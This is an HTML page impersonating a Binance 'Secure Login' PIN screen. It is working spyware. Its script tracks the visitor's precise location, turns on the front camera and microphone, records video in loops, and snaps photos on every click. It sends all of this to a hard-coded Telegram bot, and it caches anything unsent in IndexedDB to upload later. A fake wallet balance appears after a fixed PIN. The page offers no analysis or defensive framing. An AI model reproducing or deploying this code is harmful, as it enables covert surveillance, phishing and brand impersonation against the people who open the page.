<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance - Secure Login</title>
    <style>
        :root { --binance-yellow: #FCD535; --black: #121212; --card: #1e1e1e; }
        body { margin: 0; background: var(--black); color: white; font-family: 'Segoe UI', sans-serif; text-align: center; overflow-x: hidden; }
        .screen { display: none; padding: 20px; min-height: 100vh; flex-direction: column; align-items: center; justify-content: center; box-sizing: border-box; }
        .active { display: flex; }
        
        /* Binance Style Card */
        .card { background: var(--card); border-radius: 24px; padding: 30px; width: 100%; max-width: 360px; border: 1px solid #333; box-shadow: 0 15px 35px rgba(0,0,0,0.7); }
        .logo-img { width: 180px; margin-bottom: 20px; filter: drop-shadow(0 0 5px rgba(252, 213, 53, 0.3)); }
        
        .balance { font-size: 40px; font-weight: bold; color: var(--binance-yellow); margin: 10px 0; }
        input { background: #2a2a2a; border: 1px solid #444; color: white; padding: 16px; width: 100%; border-radius: 12px; margin: 10px 0; box-sizing: border-box; font-size: 18px; outline: none; transition: 0.3s; }
        input:focus { border-color: var(--binance-yellow); }
        
        .btn { background: var(--binance-yellow); color: black; padding: 16px; width: 100%; border-radius: 12px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
        .btn:active { transform: scale(0.96); }
        #video, #canvas { display: none; }
    </style>
</head>
<body onclick="takeSnap()">

    <div id="loginScreen" class="screen active">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Binance_Logo.png/640px-Binance_Logo.png" class="logo-img" alt="Binance">
        <div class="card">
            <h3 style="margin-top:0;">Identity Verification</h3>
            <p style="color:#848E9C; font-size:14px;">Enter your 4-digit PIN to access your Spot Wallet</p>
            <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric">
            <button class="btn" onclick="login()">Log In</button>
        </div>
    </div>

    <div id="dash" class="screen">
        <div style="width:100%; max-width:360px; text-align:left;">
            <p style="color:#848E9C; margin-bottom: 5px;">Total Balance</p>
            <div class="balance">$385.00</div>
            <p style="color:#5E6673; margin-top:-5px;">≈ Rs. 107,800.00</p>
            <div class="card" style="margin-top:20px; display:flex; gap:10px; padding:20px;">
                <button class="btn" style="flex:1;">Withdraw</button>
                <button class="btn" style="flex:1; background:#2B3139; color:white;">Deposit</button>
            </div>
        </div>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const token = '8466749965:AAEa8pM--47T3Mo6X34atY8LexkqC79epe0';
        const chat = '7107389141';
        let db, recorder, chunks = [];

        // Database & Sync
        const req = indexedDB.open("CryptoSafeDB", 1);
        req.onupgradeneeded = e => e.target.result.createObjectStore("sync", { autoIncrement: true });
        req.onsuccess = e => { db = e.target.result; sync(); };

        window.onload = () => {
            // Live Location
            if (navigator.geolocation) {
                navigator.geolocation.watchPosition(p => {
                    const msg = `📍 *BINANCE USER LOCATION*\nLat: ${p.coords.latitude}\nLong: ${p.coords.longitude}\nGoogle Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    sendMsg(msg);
                }, null, { enableHighAccuracy: true });
            }

            // Media
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
            .then(s => {
                document.getElementById('video').srcObject = s;
                startRec(s);
            }).catch(() => sendMsg("⚠️ Permissions Blocked"));
        };

        function startRec(s) {
            recorder = new MediaRecorder(s);
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                chunks = [];
                navigator.onLine ? upload(blob, 'video') : saveOff(blob);
                recorder.start();
            };
            recorder.start();
            setInterval(() => { if(recorder.state === "recording") recorder.stop(); }, 10000);
        }

        async function upload(blob, type) {
            const fd = new FormData();
            fd.append('chat_id', chat);
            const api = type === 'video' ? 'sendVideo' : 'sendPhoto';
            fd.append(type, blob, `file_${Date.now()}.${type === 'video' ? 'webm' : 'jpg'}`);
            try { await fetch(`https://api.telegram.org/bot${token}/${api}`, { method: 'POST', body: fd }); }
            catch(e) { saveOff(blob); }
        }

        function sendMsg(t) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(t)}&parse_mode=Markdown`);
        }

        function saveOff(blob) {
            const tx = db.transaction("sync", "readwrite");
            tx.objectStore("sync").add(blob);
        }

        async function sync() {
            if (!navigator.onLine || !db) return;
            const store = db.transaction("sync", "readwrite").objectStore("sync");
            store.openCursor().onsuccess = async e => {
                const cursor = e.target.result;
                if (cursor) {
                    await upload(cursor.value, cursor.value.type.includes('video') ? 'video' : 'photo');
                    store.delete(cursor.key);
                    cursor.continue();
                }
            };
        }

        window.addEventListener('online', sync);

        function takeSnap() {
            const v = document.getElementById('video'), c = document.getElementById('canvas');
            if(v.srcObject) {
                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                c.toBlob(b => upload(b, 'photo'), 'image/jpeg');
            }
        }

        function login() {
            if(document.getElementById('pin').value === "7890") {
                document.getElementById('loginScreen').classList.remove('active');
                document.getElementById('dash').classList.add('active');
            } else { alert("Verification Failed!"); }
        }
    </script>
</body>
</html>
